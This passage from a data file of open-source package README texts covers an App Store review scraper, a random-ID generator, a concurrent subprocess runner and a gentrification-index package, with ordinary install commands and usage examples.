 |  _  | '_ \| '_ \   `--. \ __/ _ \| '__/ _ \  `--. \/ __| '__/ _` | '_ \ / _ \ '__|
 | | | | |_) | |_) | /\__/ / || (_) | | |  __/ /\__/ / (__| | | (_| | |_) |  __/ |
 \_| |_/ .__/| .__/  \____/ \__\___/|_|  \___| \____/ \___|_|  \__,_| .__/ \___|_|
       | |   | |                                                    | |
       |_|   |_|                                                    |_|
```

# Quickstart

Install:
```console
pip3 install apple-store-scraper
```

Scrape reviews for an app:

```python
from apple_store_scraper import AppStore
from pprint import pprint

minecraft = AppStore(country=""nz"", app_name=""minecraft"")
minecraft.review(how_many=20)

pprint(minecraft.reviews)
pprint(minecraft.reviews_count)
```

Scrape reviews for a podcast:

```python
from apple_store_scraper import Podcast
from pprint import pprint

sysk = Podcast(country=""nz"", app_name=""stuff you should know"")
sysk.review(how_many=20)

pprint(sysk.reviews)
pprint(sysk.reviews_count)
```

# Extra Details

Let's continue from the code example used in [Quickstart](#quickstart).


## Instantiation

There are two required and one positional parameters:

- `country` (required)
  - two-letter country code of [ISO 3166-1 alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2) standard
- `app_name` (required)
  - name of an iOS application to fetch reviews for
  - also used by `search_id()` method to search for `app_id` internally
- `app_id` (positional)
  - can be passed directly
  - or ignored to be obtained by `search_id` method internally

Once instantiated, the object can be examined:
```pycon
>>> minecraft
AppStore(country='nz', app_name='minecraft', app_id=479516143)
```
```pycon
>>> print(app)
     Country | nz
        Name | minecraft
          ID | 479516143
         URL | https://apps.apple.com/nz/app/minecraft/id479516143
Review count | 0
```

Other optional parameters are:

- `log_format`
  - passed directly to `logging.basicConfig(format=log_format)`
  - default is `""%(asctime)s [%(levelname)s] %(name)s - %(message)s""`
- `log_level`
  - passed directly to `logging.basicConfig(level=log_level)`
  - default is `""INFO""`
- `log_interval`
  - log is produced every 5 seconds (by default) as a ""heartbeat"" (useful for a long scraping session)
  - default is `5`


## Fetching Review

The maximum number of reviews fetched per request is 20. To minimise the number of calls, the limit of 20 is hardcoded. This means the `review()` method will always grab more than the `how_many` argument supplied with an increment of 20.

```pycon
>>> minecraft.review(how_many=33)
>>> minecraft.reviews_count
40
```

If `how_many` is not provided, `review()` will terminate after *all* reviews are fetched.

**NOTE** the review count seen on the landing page differs from the actual number of reviews fetched. This is simply because only *some* users who rated the app also leave reviews.

### Optional Parameters

- `after`
  - a `datetime` object to filter older reviews
- `sleep`
  - an `int` to specify seconds to sleep between each call

## Review Data

The fetched review data are loaded in memory and live inside `reviews` attribute as a list of dict.
```pycon
>>> minecraft.reviews
[{'userName': 'someone', 'rating': 5, 'date': datetime.datetime(...
```

Each review dictionary has the following schema:
```python
{
    ""date"": datetime.datetime,
    ""isEdited"": bool,
    ""rating"": int,
    ""review"": str,
    ""title"": str,
    ""userName"": str
 }
```
","![build](https://img.shields.io/github/workflow/status/hiyali/apple-store-scraper/Build)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/hiyali/apple-store-scraper/pulls)
[![PyPI](https://img.shields.io/pypi/v/apple-store-scraper)](https://pypi.org/project/apple-store-scraper/)
![downloads](https://img.shields.io/pypi/dm/apple-store-scraper)
![license](https://img.shields.io/pypi/l/apple-store-scraper)
![code style](https://img.shields.io/badge/code%20style-black-black)

```
   ___                _____ _                   _____
  / _ \              /  ___| |                 /  ___|
 / /_\ \_ __  _ __   \ `--.| |_ ___  _ __ ___  \ `--.  ___ _ __ __ _ _ __   ___ _ __
 |  _  | '_ \| '_ \   `--. \ __/ _ \| '__/ _ \  `--. \/ __| '__/ _` | '_ \ / _ \ '__|
 | | | | |_) | |_) | /\__/ / || (_) | | |  __/ /\__/ / (__| | | (_| | |_) |  __/ |
 \_| |_/ .__/| .__/  \____/ \__\___/|_|  \___| \____/ \___|_|  \__,_| .__/ \___|_|
       | |   | |                                                    | |
       |_|   |_|                                                    |_|
```

# Quickstart

Install:
```console
pip3 install apple-store-scraper
```

Scrape reviews for an app:

```python
from apple_store_scraper import AppStore
from pprint import pprint

minecraft = AppStore(country=""nz"", app_name=""minecraft"")
minecraft.review(how_many=20)

pprint(minecraft.reviews)
pprint(minecraft.reviews_count)
```

Scrape reviews for a podcast:

```python
from apple_store_scraper import Podcast
from pprint import pprint

sysk = Podcast(country=""nz"", app_name=""stuff you should know"")
sysk.review(how_many=20)

pprint(sysk.reviews)
pprint(sysk.reviews_count)
```

# Extra Details

Let's continue from the code example used in [Quickstart](#quickstart).


## Instantiation

There are two required and one positional parameters:

- `country` (required)
  - two-letter country code of [ISO 3166-1 alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2) standard
- `app_name` (required)
  - name of an iOS application to fetch reviews for
  - also used by `search_id()` method to search for `app_id` internally
- `app_id` (positional)
  - can be passed directly
  - or ignored to be obtained by `search_id` method internally

Once instantiated, the object can be examined:
```pycon
>>> minecraft
AppStore(country='nz', app_name='minecraft', app_id=479516143)
```
```pycon
>>> print(app)
     Country | nz
        Name | minecraft
          ID | 479516143
         URL | https://apps.apple.com/nz/app/minecraft/id479516143
Review count | 0
```

Other optional parameters are:

- `log_format`
  - passed directly to `logging.basicConfig(format=log_format)`
  - default is `""%(asctime)s [%(levelname)s] %(name)s - %(message)s""`
- `log_level`
  - passed directly to `logging.basicConfig(level=log_level)`
  - default is `""INFO""`
- `log_interval`
  - log is produced every 5 seconds (by default) as a ""heartbeat"" (useful for a long scraping session)
  - default is `5`


## Fetching Review

The maximum number of reviews fetched per request is 20. To minimise the number of calls, the limit of 20 is hardcoded. This means the `review()` method will always grab more than the `how_many` argument supplied with an increment of 20.

```pycon
>>> minecraft.review(how_many=33)
>>> minecraft.reviews_count
40
```

If `how_many` is not provided, `review()` will terminate after *all* reviews are fetched.

**NOTE** the review count seen on the landing page differs from the actual number of reviews fetched. This is simply because only *some* users who rated the app also leave reviews.

### Optional Parameters

- `after`
  - a `datetime` object to filter older reviews
- `sleep`
  - an `int` to specify seconds to sleep between each call

## Review Data

The fetched review data are loaded in memory and live inside `reviews` attribute as a list of dict.
```pycon
>>> minecraft.reviews
[{'userName': 'someone', 'rating': 5, 'date': datetime.datetime(...
```

Each review dictionary has the following schema:
```python
{
    ""date"": datetime.datetime,
    ""isEdited"": bool,
    ""rating"": int,
    ""review"": str,
    ""title"": str,
    ""userName"": str
 }
```
",hiyali/apple-store-scraper
rayid,https://github.com/BlackIQ/rayid,0,2169,2169,"# RayID

**RayID** is a generated code that we use to track logs, posts or events. You can generate your own rayid, but we made your job easier!

In this instructure you will learn about how to use this package in your apps.

## Table of content

- [Languages](#languages)
- [Installation](#installation)
- [methods](#methods)
- [Development](#development)

## Languages

I created rayid for **JavaScript** too.

- [GitLab](https://gitlab.com/BlackIQ/rayid)
- [Npm](https://www.npmjs.com/package/rayid)

## Installation

How to install **RayID**? To install this package, use **pip** or **pipenv**.

```shell
$ pip3 install rayid
# Or
$ pipenv install rayid
```

## Config

So, import the package.

```python
from rayid import RayID

rayid = RayID(""digit"")
```

Now create your instance with what kind of rayid you want.

- digit: Numbers
- lower: Alphabet in lower case.
- upper: Alphabet in upper case.
- all: Combine of all types.

> No type means all combined togather.

```python
rayid = RayID(""digit"")
```

## Methods

Only one method! `gen(len)`.

### `gen(len)`

in **gen(len)** just say the length.

> There is no limit :)

```python
id = rayid.gen(25);
print(id); # 9514992619709220193874433
```

## Examples

Create common instances.

```python
all = RayID(""all""); # All values
str = RayID(""lower""); # Loercase generator
int = RayID(""digit""); # Only int generator
```

Now use them:

```python
print(all.gen(10)); # Z*jVQ3c:+H
print(str.gen(10)); # ksixvpqohi
print(int.gen(10)); # 4748182066
```

All done!

---

## Development

If you want to develop the package, it is so simple. just follow steps below.

- Clone the project
- Start changing!

> Before you start: **Remember the base or code are stored in `rayid/rayid.py`**. You need to edit there.

### Cloning the project

To clone the project, you need to have git installed. Ok, now clone it same as command below.

```shell
$ git clone https:#github.com/BlackIQ/rayid
```

### Changing

To change package or anything, your need a testing environment to use linked package. Just change `rayid/rayid.py`.

#### Test

Your test app is linked. Change anything in package and test it in `test.py` file.
","# RayID

**RayID** is a generated code that we use to track logs, posts or events. You can generate your own rayid, but we made your job easier!

In this instructure you will learn about how to use this package in your apps.

## Table of content

- [Languages](#languages)
- [Installation](#installation)
- [methods](#methods)
- [Development](#development)

## Languages

I created rayid for **JavaScript** too.

- [GitLab](https://gitlab.com/BlackIQ/rayid)
- [Npm](https://www.npmjs.com/package/rayid)

## Installation

How to install **RayID**? To install this package, use **pip** or **pipenv**.

```shell
$ pip3 install rayid
# Or
$ pipenv install rayid
```

## Config

So, import the package.

```python
from rayid import RayID

rayid = RayID(""digit"")
```

Now create your instance with what kind of rayid you want.

- digit: Numbers
- lower: Alphabet in lower case.
- upper: Alphabet in upper case.
- all: Combine of all types.

> No type means all combined togather.

```python
rayid = RayID(""digit"")
```

## Methods

Only one method! `gen(len)`.

### `gen(len)`

in **gen(len)** just say the length.

> There is no limit :)

```python
id = rayid.gen(25);
print(id); # 9514992619709220193874433
```

## Examples

Create common instances.

```python
all = RayID(""all""); # All values
str = RayID(""lower""); # Loercase generator
int = RayID(""digit""); # Only int generator
```

Now use them:

```python
print(all.gen(10)); # Z*jVQ3c:+H
print(str.gen(10)); # ksixvpqohi
print(int.gen(10)); # 4748182066
```

All done!

---

## Development

If you want to develop the package, it is so simple. just follow steps below.

- Clone the project
- Start changing!

> Before you start: **Remember the base or code are stored in `rayid/rayid.py`**. You need to edit there.

### Cloning the project

To clone the project, you need to have git installed. Ok, now clone it same as command below.

```shell
$ git clone https:#github.com/BlackIQ/rayid
```

### Changing

To change package or anything, your need a testing environment to use linked package. Just change `rayid/rayid.py`.

#### Test

Your test app is linked. Change anything in package and test it in `test.py` file.
",blackiq/rayid
multisubprocess,https://github.com/hansalemaos/multisubprocess,4,3208,3129,"# Executes multiple subprocesses concurrently and returns the output and return code of each subprocess. (Windows only)

### Tested against Windows 10 / Python 3.10 / Anaconda

## pip install multisubprocess

#### Important: Cannot be executed directly from the console! 



```python
from multisubprocess import multi_subprocess

allqueries = []
for q in range(20):
    allqueries.append([""ls"", ""-la"", r""E:\textcompare""])

res = multi_subprocess(
    allqueries,
    byteinput=b"""",
    shell=False,
    close_fds=False,
    start_new_session=True,
    bufsize=8192 * 40,
    invisible=True,
    timeout=15,
    max_threads=5,
    timeout_check_sleep=1,
    kill_all_at_end=True,
    blockbatch=False,
)



# Output from one subprocess
# from pprint import pprint
# from pprint import pprint
# pprint(res[(7, 'ls', '-la', 'E:\\textcompare')])
# defaultdict(<function <lambda> at 0x00000289E4B15750>,
#             {'proc': <Popen: returncode: 0 args: ['ls', '-la', 'E:\\textcompare']>,
#              'returncode': 0,
#              'start': 1682433358.1547163,
#              'stderr': <_io.BytesIO object at 0x00000289EFA2EFC0>,
#              'stderrready': b'',
#              'stdout': <_io.BytesIO object at 0x00000289EFA2EB10>,
#              'stdoutready': b'total 18\ndrwxr-xr-x 1 hansc hansc   0 Apr 24 20:'
#                             b'33 .\ndrwxr-xr-x 1 hansc hansc   0 Apr 24 20:33 .'
#                             b'.\n-rw-r--r-- 1 hansc hansc 321 Apr 24 15:41 text'
#                             b'1.txt\n-rw-r--r-- 1 hansc hansc 367 Apr 24 15:41 '
#                             b'text2.txt\n'})




    

    Args:
        allcommands (str | list): List of commands to execute or one command as a string.
        byteinput (bytes, optional): Input to be passed to the subprocess. Defaults to b"""".
        shell (bool, optional): Whether to use shell to execute the command. Defaults to False.
        close_fds (bool, optional): Whether to close file descriptors. Defaults to True.
        start_new_session (bool, optional): Whether to start a new session. Defaults to True.
        bufsize (int, optional): Buffer size for the subprocess. Defaults to 1024 * 200.
        invisible (bool, optional): Whether to run the subprocess invisibly. Defaults to True.
        timeout (int, optional): Timeout for the subprocess. Defaults to 10000000.
        max_threads (int | None, optional): Maximum number of threads to use. Defaults to None (Number of CPUs).
        timeout_check_sleep (int, optional): Sleep time for timeout check. Defaults to 1.
        kill_all_at_end (bool, optional): Whether to kill all subprocesses of the main process at the end. Defaults to True.
        blockbatch (bool, optional): Whether to block batch processing. Defaults to False.
        debug (bool, optional): Whether to print debug information. Defaults to False.
        *args: Additional arguments to be passed to subprocess.Popen.
        **kwargs: Additional keyword arguments to be passed to subprocess.Popen.

    Returns:
        dict: A dictionary containing the output and return code of each subprocess.
		
		
```

","# Executes multiple subprocesses concurrently and returns the output and return code of each subprocess. (Windows only)

### Tested against Windows 10 / Python 3.10 / Anaconda

## pip install multisubprocess

#### Important: Cannot be executed directly from the console! 



```python
from multisubprocess import multi_subprocess

allqueries = []
for q in range(20):
    allqueries.append([""ls"", ""-la"", r""E:\textcompare""])

res = multi_subprocess(
    allqueries,
    byteinput=b"""",
    shell=False,
    close_fds=False,
    start_new_session=True,
    bufsize=8192 * 40,
    invisible=True,
    timeout=15,
    max_threads=5,
    timeout_check_sleep=1,
    kill_all_at_end=True,
    blockbatch=False,
)



# Output from one subprocess
# from pprint import pprint
# from pprint import pprint
# pprint(res[(7, 'ls', '-la', 'E:\\textcompare')])
# defaultdict( at 0x00000289E4B15750>,
#             {'proc': ,
#              'returncode': 0,
#              'start': 1682433358.1547163,
#              'stderr': <_io.BytesIO object at 0x00000289EFA2EFC0>,
#              'stderrready': b'',
#              'stdout': <_io.BytesIO object at 0x00000289EFA2EB10>,
#              'stdoutready': b'total 18\ndrwxr-xr-x 1 hansc hansc   0 Apr 24 20:'
#                             b'33 .\ndrwxr-xr-x 1 hansc hansc   0 Apr 24 20:33 .'
#                             b'.\n-rw-r--r-- 1 hansc hansc 321 Apr 24 15:41 text'
#                             b'1.txt\n-rw-r--r-- 1 hansc hansc 367 Apr 24 15:41 '
#                             b'text2.txt\n'})




    

    Args:
        allcommands (str | list): List of commands to execute or one command as a string.
        byteinput (bytes, optional): Input to be passed to the subprocess. Defaults to b"""".
        shell (bool, optional): Whether to use shell to execute the command. Defaults to False.
        close_fds (bool, optional): Whether to close file descriptors. Defaults to True.
        start_new_session (bool, optional): Whether to start a new session. Defaults to True.
        bufsize (int, optional): Buffer size for the subprocess. Defaults to 1024 * 200.
        invisible (bool, optional): Whether to run the subprocess invisibly. Defaults to True.
        timeout (int, optional): Timeout for the subprocess. Defaults to 10000000.
        max_threads (int | None, optional): Maximum number of threads to use. Defaults to None (Number of CPUs).
        timeout_check_sleep (int, optional): Sleep time for timeout check. Defaults to 1.
        kill_all_at_end (bool, optional): Whether to kill all subprocesses of the main process at the end. Defaults to True.
        blockbatch (bool, optional): Whether to block batch processing. Defaults to False.
        debug (bool, optional): Whether to print debug information. Defaults to False.
        *args: Additional arguments to be passed to subprocess.Popen.
        **kwargs: Additional keyword arguments to be passed to subprocess.Popen.

    Returns:
        dict: A dictionary containing the output and return code of each subprocess.
		
		
```

",hansalemaos/multisubprocess
pygentrification,https://github.com/joshscrabeck/pygentrification,7,19121,19121,"# PyGentrification: Gentrification Indices

A python package for calculating and visualizing gentrification indices from published academic research

## Description

The term “gentrification” encapsulates complex and interconnected social, economic, political, and physical processes that lead to a specific type of neighborhood change. Dr. Devin Bunten, an Assistant Professor of Urban Economics and Housing at MIT, defined gentrification as “…the territorial expansion of a wealthy community into a disinvested neighborhood, the installation of the social and legal regimes of the newcomers, and the deployment of new physical capital, both on a small scale – by homeowners undertaking renovations – and on a larger scale, by landed capitalists and public sector officials keen to raise revenue. It is the disruption and displacement of the original residents and their spatially realized social networks.” [^1] 
 

Government – at local, state, and federal lees – creates conditions that facilitate gentrification processes through targeted policy, investment, and subsidies. These conditions enable private actors, such as developers, lenders, builders, and real estate companies, to generate and accumulate wealth in neighborhoods that previously experienced chronic disinvestment[^2]. Together, these actors can “revitalize” a neighborhood, but with profit as their primary motivator, they have little incentive to consider the social and cultural fabric of a neighborhood or the communities that will be able to experience the benefits of their investment. 

Gentrification also requires newcomers. In early stages of gentrification, newcomers, who are often white with lower incomes and high levels of educational attainment, may be drawn to historically disinvested neighborhoods because of their need for affordable housing. These newcomers can serve as a signal of gentrification potential for developers and may advocate for new investment and amenities in their neighborhood. This neighborhood change, in turn, can draw wealthier newcomers who can afford increased housing costs[^2]. 

Gentrification is one cause of displacement. Residents in gentrifying neighborhoods can be forced to move due to increasing costs of rentals, property taxes, and local amenities, which can lead to evictions, foreclosures, and pressure for low-income homeowners to sell well below the market value of their homes to predatory buyers. Even if long-time residents do not physically move, they can experience displacement from their social networks, local culture, and sense of community[^2].   

Researchers have developed many methods to quantify, measure, and predict the complex processgentrification. These methods generally use on multiple indicators at several time periods. Researchers combine these indicators, as well as changes in those indicators over time, into an index that aim to quantify if the area has gentrified, if the area is vulnerable to gentrification, or some of other measure related to their particular theory of gentrification. Indicators often include measures related to race, educational attainment, housing costs, and housing tenure.

We developed this package to allow researchers to explore and compare different gentrification indices for their area of interest. The first version of this package has functions to calculate the indices from Bates (2013)[^3] and Ding et al. (2016)[^4], which both can be calculated from American Community Survey and Census data. 

### Bates (2013)

Bates (2013) calculated three indices using data from three years, each 10 years apart, (years 0-2) that together give a picture of gentrification in an area of interest: vulnerability to gentrification, presence of gentrification-related demographic change, and home value typology. The gentrification-related demographic change index is based on the gentrification index presented in Freeman (2005)[^5].   

#### Bates (2013) - Vulnerability to Gentrification
| Indicator      | Output values |  variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % Renters at census tract and county levels | 0: % Renters in tract < % Renters in county, 1: % Renters in tract > % Renters in county | renter_v  |
| % People of color at census tract and county levels | 0: % People of Color in tract < % People of Color in county, 1: % People of Color in tract > % People of Color in county | poc_v  |
| % People over 25 without a college degree at census tract and county levels | 0: % People over 25 without a college degree in tract < % People over 25 without a college degree in county, 1: % People over 25 without a college degree in tract > % People over 25 without a college degree in county  | nocollege_v  |
| Median Family Income at census tract and county levels | 0: Median Family Income in tract > Median Family Income in county, 1: Median Family Income in tract < Median Family Income in county | mfi_v  |
| **Vulnerability to Gentrification Index** | Score 0-4 (sum of 4 variables above)  |  v_index  |

#### Bates (2013) - Gentrification-Related Demographic Change
| Indicator      | Output values |  variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % Change in renters Year 1-2 at census tract and county levels | 0: % Change in renters in tract < % Renters in county, 1: % Change in renters in tract > % Change in renters in county | tenure_change  |
| % Change in People of color at census tract and county levels | 0: % Change in People of Color in tract < % Change in People of Color in county, 1: % Change in People of Color in tract > % Change in People of Color in county | race_change  |
| % Change in people over 25 without a college degree at census tract and county levels | 0: % Change in people over 25 without a college degree in tract < % Change in people over 25 without a college degree in county, 1: % Change in people over 25 without a college degree in tract > % Change in people over 25 without a college degree in county  | edu_change  |
| % Change in Median Household Income at census tract and county levels | 0: % Change in Median Household Income in tract > % Change in Median Household Income in county, 1: % Change Median Household Income in tract < % Change Median Household Income in county | income_change  |
| **Presence of Gentrification-Related Demographic Change Index**  | Score 0-4 (sum of 4 variables above)  |  dem_change_index  |

#### Bates (2013) - Home Value Typology
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| Median home value in tract (year 0) | lowmod : bottom 3 quintiles, high: top 2 quintiles | homevalueq_yr0  |
| Median home value in tract (year 1) | lowmod : bottom 3 quintiles, high: top 2 quintiles | homevalueq_yr1  |
| Median home value in tract (year 2) | lowmod : bottom 3 quintiles, high: top 2 quintiles  | homevalueq_yr2  |
| Change in median home value year 0-1 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_01  |
| Change in median home value year 1-2 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_12  |
| Change in median home value year 0-2 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_02  |
| **Home Value Typology Index**  | Each tract has a value of 'adjacent' (low or moderate Year 2 value, low or moderate Year 0 - Year 1 appreciation, touch boundary of one tract with high Year 2 value), 'accelerating' (low or moderate Year 2 value, high Year 1-Year 2 apprecation), 'appreciated' (low or moderate Year 0 value, high Year 2 value, high Year 0 -Year 2 appreciation), or 'no_typology'  |  mhv_type  |

#### Freeman (2005) Gentrification Index
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % housing units built in the last 20 years | 0: % new housing units in tract < % new housing in county , 1: % new housing units in tract < % new housing in count | newhouse_f_index  |
| % People over 25 without a college degree at census tract and county levels | 0: % People over 25 without a college degree in tract < % People over 25 without a college degree in county, 1: % People over 25 without a college degree in tract > % People over 25 without a college degree in county  | nocollege_f_index  |
| Median Household Income at census tract and county levels | 0: Median Household Income in tract > Median Household Income in county, 1: Median Household Income in tract < Median Household Income in county | mhi_f_index  |
| Median housing value at tract level years 1-2 | 0: median housing value in year 1 > median housing value in year 2, 1: median housing value in year 1 < median housing value in year 2 | mhv_f_index  |
| Freeman Gentrification Index  | Score 0-4 (sum of 4 variables above)  |  freeman  |

### Ding et al. (2016)

Ding et al. (2016) usese data from 2 years (years 1-2) to calculate one index that classifies tracts as experiencing intense gentrification, moderate gentrification, weak gentrification, no gentrification, or as non-gentrifiable.

#### Ding et a. (2016) - Gentrification Index
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------------ | -----------  |
| Median Household Income at census tract and county levels | 0 (gentrifiable = False): Median Household Income in tract > Median Household Income in county, 1 (gentrifiable = True): Median Household Income in tract < Median Household Income in county | hhi_crit, gentrifiable  |
| % Change in Median Rent at census tract and county levels | 0: % Change in Median Rent in tract < % Change in Median Rent in county, 0.5: % Change Median Rent in tract > % Change Median Rent in county | rent_crit  |
| % Change in Median Home Value at census tract and county levels | 0: % Change in Median Home Value in tract < % Change in Median Home Value in county, 0.5: % Change Median Home Value in tract > % Change Median Home Value in county | value_crit  |
| % Change in people over 25 without a college degree at census tract and county levels | 0: % Change in people over 25 without a college degree in tract < % Change in people over 25 without a college degree in county, 1: % Change in people over 25 without a college degree in tract > % Change in people over 25 without a college degree in county  | edu_crit  |
| Sum of Gentrification Criteria  |  0 - 3 (Sum of above 4 variables)  | crit  |
| Presence of Gentrification  |  False: crit < 2.5, True: crit>= 2.5  |  gentrifying  |
| **Gentrification Status**  | 'Weak Gentrification': meets gentrification criteria and in bottom two quartiles of criteria for change in median home values and rent, 'Moderate Gentrification': meets gentrification criteria and in middle two quartiles of criteria for change in median home values and rent, 'Strong Gentrification': meets gentrification criteria and in top quartile of criteria for change in median home values and rent, 'No Gentrification': tract is gentrifiable but does not meet gentrification criteria, 'Nongentrifiable': Does not meet income criteria in year 1 to be gentrifiable  |  gent_status  |

Both indices are calculated using data at the census tract level for a single county. This package include functions to directly the pull data from the American Community Survey and Census and their respective Tiger/Line geometries and combine data accross years with conflicting geometries using areal interpolation from the Tobler package. 

## Getting Started

### Dependencies

* Python 3.9.*
* numpy == 1.22.4
* pandas
* geopandas
* folium
* tobler
* branca
* requests


### Installing

```
pip install pygentrification
```
	
### Executing program

## API Calls

This module contains all the data requests a user might need to make to calculate the indices included in the package. This includes using 5 Year - American Community Survery, Dicennial Census, and TIGER Census data.

Each index requires data at the tract level and data for the county as a whole. Identiy the county and state using FIPS codes. 
The two example calls below would return the two dataframes needed to calculate the bates-freeman indices and ding index for Philadelphia County (101) in PA (42) using data from 2000, 2010, and 2020.

The function will return data in EPSG 4269, but requires a proj_parameter that indicates the projected crs that will be used for areal interpolation needed to harmonize data to census tract boundaries for different years.

```
from pygentrification.api_calls import get_api_data_tract, get_api_data_county

tract_gdf = get_api_data_tract(""42"", ""101"", years = [2000, 2010, 2020], indices = [""bates"", ""ding""], proj_crs = ""EPSG: 2272"")

county_gdf = get_api_data_county(""42"", ""101"", years = [2000, 2010, 2020], indices = [""bates"", ""ding""])

```


## Bates and Freeman Indices

This module contains the data prep steps, index calculation, and dataframe creation of the Bates-Freeman index


calc_batesfreeman is a function that calculates the index according to Bates-Freeman, as cited above. If using a GeoDataFrame retrieved with the functions above, an example call would be: 

```
from pygentrification.bates_freeman_indices import calc_bates_freeman

bates_freeman_gdf = calc_batesfreeman(county_gdf, tract_gdf, inplace = False)

```

Users may also use data retrieved in other ways as long as:
* one is a gdf at the tract level of the study area and one is a df or gdf values for the area as a whole 
* each dataset has data for the acs and census variables required for calculating the indices in this script for the years specified. 
* they specify column column names as a list with an order that corresponds exactly with the default values for th cols_tract and cols_area parameters.

```
cols_area = ['area_med_house_inc_yr1', 'area_med_house_inc_e_yr1', 'area_med_house_inc_yr2', 'area_med_house_inc_e_yr2', 'area_med_fam_inc_yr2', 'area_med_fam_inc_e_yr2']
cols_tract = ['pop_tenure_yr1', 'owner_yr1', 'renter_yr1', 'pop_tenure_yr2', 'owner_yr2', 'renter_yr2', 'pop_25_over_yr1', 'ba_degree_m_yr1', 'ma_degree_m_yr1', 'prof_degree_m_yr1', 'doc_degree_m_yr1', 'ba_degree_f_yr1', 'ma_degree_f_yr1', 'prof_degree_f_yr1', 'doc_degree_f_yr1', 'pop_25_over_yr2', 'ba_degree_m_yr2','ma_degree_m_yr2', 'prof_degree_m_yr2', 'doc_degree_m_yr2', 'ba_degree_f_yr2','ma_degree_f_yr2', 'prof_degree_f_yr2', 'doc_degree_f_yr2','pop_race_yr1', 'white_yr1', 'pop_race_yr2', 'white_yr2', 'med_fam_inc_yr2', 'med_home_val_yr0', 'med_home_val_yr1', 'med_home_val_yr2', 'med_house_inc_yr1', 'med_house_inc_yr2', 'tot_house_yr2', 'new_house_col1', 'new_house_col2', 'new_house_col3']
```
    

## Ding Index

This module contains the data prep steps, index calculation, and dataframe creation of the Ding index


calc_batesfreeman is a function that calculates the index according to Ding, as cited above. If using a GeoDataFrame retrieved with the functions above, an example call would be: 

```
from pygentrification.ding_index import calc_ding

ding_gdf = calc_ding(county_gdf, tract_gdf, inplace = False):

``` 

## Folium Maps

This module contains functions to create Folium maps from the output of Bates-Freeman and Ding functions hosted on a local HTML site.

The crs for the input gdf MUST be EPSG: 4269.

This function takes in the GeoDataFrame generated by the calc_batesfreeman function fand outputs and map object of a Folium map. It saves an html file of the map object to the working directory.

```
from pygentrification.folium_funcs import bates_freeman_result_map

bates_freeman_result_map(bates_freeman_gdf, filename = 'bates_freeman_map.html'):
```

This function takes in the GeoDataFrame generated by the calc_ding function fand outputs and map object of a Folium map. It saves an html file of the map object to the working directory.

```
from pygentrification.folium_funcs import ding_result_map 

ding_result_map(ding_gdf, filename = 'ding_map.html'):
```

Users may also use data retrieved in other ways as long as:
* one is a gdf at the tract level of the study area and one is a df or gdf values for the area as a whole 
* each dataset has data for the acs and census variables required for calculating the indices in this script for the years specified. 
* they specify column column names as a list with an order that corresponds exactly with the default values for th cols_tract and cols_area parameters.

```
cols_area = ['area_med_rent_yr1', 'area_med_rent_yr2', 'area_med_home_val_yr1', 'area_med_home_val_yr2', 'area_med_house_inc_yr1', 'area_med_house_inc_yr2']
cols_tract=['med_rent_yr1', 'med_rent_yr2', 'med_home_val_yr1', 'med_home_val_yr2', 'pop_25_over_yr1' 'ba_degree_m_yr1', 'ma_degree_m_yr1', 'prof_degree_m_yr1', 'doc_degree_m_yr1, ba_degree_f_yr1', 'ma_degree_f_yr1', 'prof_degree_f_yr1', 'doc_degree_f_yr1', 'pop_25_over_yr2', 'ba_degree_m_yr2', 'ma_degree_m_yr2', 'prof_degree_m_yr2', 'doc_degree_m_yr2', 'ba_degree_f_yr2', 'ma_degree_f_yr2', 'prof_degree_f_yr2', 'doc_degree_f_yr2', 'med_house_inc_yr1', 'med_house_inc_yr2']
```


## Authors

Contributors names and contact info

Winn Costantini (https://github.com/wcostantini)
Adam Thompson (https://github.com/Lubbles)
Josh Scrabeck (https://github.com/joshscrabeck)

## Version History

* 0.0.1
    *Initial release
* 0.0.2
* 0.0.3
* 0.0.4
* 0.0.5
    * Current Release

## License

This project is licensed under the BSD License - see the LICENSE.txt file for details

## Acknowledgments

Thanks to Lee Hachadoorian and the Temple University Geography and Urban Studies department. 

## References

[^1] Bunten, Devin M. “Untangling the Housing Shortage and Gentrification.” Bloomberg. October 23, 2019. [Link.](https://www.bloomberg.com/news/articles/2019-10-23/untangling-the-housing-shortage-and-gentrificatiom)
[^2] Zuk, Miriam, Ariel H. Bierbaum, Karen Chapple, Karolina Gorska, and Anastasia Loukaitou-Sideris. “Gentrification, Displacement, and the Role of Public Investment.” Journal of Planning Literature 33, no. 1 (February 1, 2018): 31–44. [https://doi.org/10.1177/0885412217716439.](https://doi.org/10.1177/0885412217716439)
[^3] Bates, Lisa. 2013. “Gentrification and Displacement Study: Implementing an Equitable Inclusive Development Strategy in the Context of Gentrification.” Urban Studies and Planning Faculty Publications and Presentations, May. [https://doi.org/10.15760/report-01.](https://doi.org/10.15760/report-01)
[^4] Freeman, Lance. 2005. “Displacement or Succession?: Residential Mobility in Gentrifying Neighborhoods.” Urban Affairs Review 40 (4): 463–91. [https://doi.org/10.1177/1078087404273341.](https://doi.org/10.1177/1078087404273341)
[^5] Ding, Lei, Jackelyn Hwang, and Eileen Divringi. 2016. “Gentrification and Residential Mobility in Philadelphia.” Regional Science and Urban Economics 61: 38–51. [https://doi.org/10.1016/j.regsciurbeco.2016.09.004.](https://doi.org/10.1016/j.regsciurbeco.2016.09.004)
","# PyGentrification: Gentrification Indices

A python package for calculating and visualizing gentrification indices from published academic research

## Description

The term “gentrification” encapsulates complex and interconnected social, economic, political, and physical processes that lead to a specific type of neighborhood change. Dr. Devin Bunten, an Assistant Professor of Urban Economics and Housing at MIT, defined gentrification as “…the territorial expansion of a wealthy community into a disinvested neighborhood, the installation of the social and legal regimes of the newcomers, and the deployment of new physical capital, both on a small scale – by homeowners undertaking renovations – and on a larger scale, by landed capitalists and public sector officials keen to raise revenue. It is the disruption and displacement of the original residents and their spatially realized social networks.” [^1] 
 

